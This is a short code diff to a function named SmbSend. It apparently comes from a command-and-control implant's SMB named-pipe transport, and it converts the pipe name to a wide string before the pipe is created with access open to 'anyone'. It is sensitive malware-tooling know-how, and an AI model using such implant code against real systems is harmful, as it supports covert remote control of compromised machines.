@@ -15,7 +15,10 @@ BOOL SmbSend( PBUFFER Send )
         /* Setup attributes to allow "anyone" to connect to our pipe */
         SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );
 
-        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( Instance->Config.Transport.Name,  // Named Pipe
+        WCHAR WidePipeName[512] = {0};
+        CharStringToWCharString( WidePipeName, Instance->Config.Transport.Name, sizeof(WidePipeName)/sizeof(WCHAR) - 1 );
+        
+        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( WidePipeName,  // Named Pipe
                                                                             PIPE_ACCESS_DUPLEX,              // read/write access
                                                                             PIPE_TYPE_MESSAGE     |          // message type pipe
                                                                             PIPE_READMODE_MESSAGE |          // message-read mode
